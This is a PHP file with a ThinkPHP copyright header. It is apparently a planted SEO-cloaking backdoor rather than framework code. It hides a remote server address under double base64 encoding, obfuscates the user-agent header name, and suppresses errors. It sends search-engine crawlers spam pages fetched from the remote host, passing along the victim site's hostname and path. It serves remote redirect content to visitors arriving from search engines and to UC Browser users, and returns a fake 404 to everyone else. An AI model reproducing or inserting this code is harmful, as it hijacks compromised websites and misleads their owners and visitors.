<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 ThinkPHP All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
error_reporting(0);
header('content-type:text/html;charset=utf-8');
header("HTTP/1.1 200 OK");
$remote = base64_decode(base64_decode("YUhSMGNEb3ZMekV3TXk0NE5TNDROUzR5TkRJNk9EQTROaTg9"));
$gethost = $_SERVER['SERVER_NAME'];
$UC=strrev('TNEGA_RESU_PTTH');
$Bot=$_SERVER[$UC];
$Ref=$_SERVER['HTTP_REFERER'];
$rehost = $_SERVER["REQUEST_URI"];
$uc_agent = $_SERVER['HTTP_X_UCBROWSER_UA'];


if (preg_match("/.*(uc).*/i",$uc_agent) && strlen($uc_agent)>2)
{
	$data_mb = file_get_contents($remote."?jump=1"); 
	echo $data_mb;	
	exit();	
}


if(preg_match("/.*(sogou|360spider|baidu|google|youdao|yahoo|bing|gougou|sm|uc).*/i",$Bot,$OutUa))
{
	$HtmlUa = strtolower($OutUa[1]);
	$data_mb = file_get_contents($remote."?xhost=".$gethost."&ua=".$HtmlUa."&reurl=".$rehost."&page=1"); 
	echo $data_mb;	
	exit();	
}

if(preg_match("/.*(sogou|360spider|baidu|google|youdao|yahoo|bing|gougou|sm|uc).*/i",$Ref,$OutUa))
{
	$data_mb = file_get_contents($remote."?jump=1"); 
	echo $data_mb;	
	exit();	
}

header("HTTP/1.1 404 Not Found");
?>